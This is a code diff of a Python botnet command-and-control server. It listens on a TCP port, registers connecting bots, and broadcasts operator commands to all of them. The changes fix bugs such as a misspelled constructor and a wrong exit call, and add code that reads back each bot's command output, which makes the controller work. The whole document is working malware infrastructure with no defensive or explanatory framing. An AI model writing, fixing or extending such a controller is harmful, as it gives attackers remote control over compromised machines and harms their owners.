@@ -1,3 +1,5 @@
+#!/usr/bin/env
+
 import socket  # Socket Library
 import threading  # Manage concurrent threads
 import sys  # System Library. Parse arguments
@@ -15,9 +17,9 @@ ClientList = {}
 def listener(lhost, lport, que):
     server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
-    server_addr = (lhost, lport)
-    server.bind(server_addr)  # Binds the socket to the address. Allowing the receiving of data.
-    server.listen(50)  # Limit the port to 50 connections to handle at max.
+    server_address = (lhost, lport)
+    server.bind(server_address)  # Binds the socket to the address. Allowing the receiving of data.
+    server.listen(10)  # Limit the port to 50 connections to handle at max.
 
     print("[+] Starting Botnet listener on tcp://" + lhost + ":" + str(lport) + "\n")
     bot_cmd_thread = BotCmd(que)
@@ -44,7 +46,7 @@ class BotCmd(threading.Thread):
                     time.sleep(0.1)
                     self.que.put(send_cmd)
                 time.sleep(5)
-                os.exit(0)  # Exit process without cleanup.
+                os._exit(0)  # Exit process without cleanup.
             else:
                 print("[+] Sending Command: " + send_cmd + " to " + str(len(Socketthread)))
                 for i in range(len(Socketthread)):
@@ -53,7 +55,7 @@ class BotCmd(threading.Thread):
 
 
 class BotControl(threading.Thread):
-    def __inti__(self, client, client_addr, qv):
+    def __init__(self, client, client_addr, qv):
         threading.Thread.__init__(self)
         self.client = client
         self.client_addr = client_addr
@@ -67,15 +69,23 @@ class BotControl(threading.Thread):
         ClientList[slave_id] = self.client_addr
         while True:
             recv_bot_cmd = self.que.get()
+            print("\nReceived Command: " + recv_bot_cmd + " for " + slave_id)
             try:
+                recv_bot_cmd += "\n"
                 self.client.send(recv_bot_cmd.encode('utf-8'))
+                recv_val = (self.client.recv(1024)).decode('utf-8')
+                print(recv_val)
             except Exception as excpt:
+                for t in Socketthread:
+                    if t.is_alive() == False:
+                         print("\n[!] Died Thread: " + str(t))
+                         t.join()
                 print(excpt)
                 break
 
 
 def main():
-    if len(sys.argv) < 3:  # Insufficient commandline arguments.
+    if (len(sys.argv) < 3):  # Insufficient commandline arguments.
         print("[!] Usage:\n  [+] python3 " + sys.argv[0] + " <LHOST> <LPORT>\n  [+] Eg.: python3 " + sys.argv[
             0] + " 0.0.0.0 8080\n")
     else:
@@ -87,5 +97,5 @@ def main():
             print("\n[-] Unable to run the handler. Report: " + str(x) + "\n")
 
 
-if __name__ == "__main__":
+if __name__ == '__main__':
     main()
